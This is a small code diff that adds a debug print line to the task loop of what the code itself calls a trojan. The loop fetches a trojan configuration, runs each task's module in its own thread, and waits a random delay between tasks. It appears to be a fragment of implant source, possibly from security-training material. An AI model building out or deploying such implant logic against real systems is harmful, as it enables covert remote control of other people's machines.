@@ -89,6 +89,7 @@ while True:
 		config = get_trojan_config()
 
 		for task in config:
+                        print "doing task {}".format(task)
 			t = threading.Thread(target=module_runner, args=(task['module'],))
 			t.start()
 			time.sleep(random.randint(1, 10))
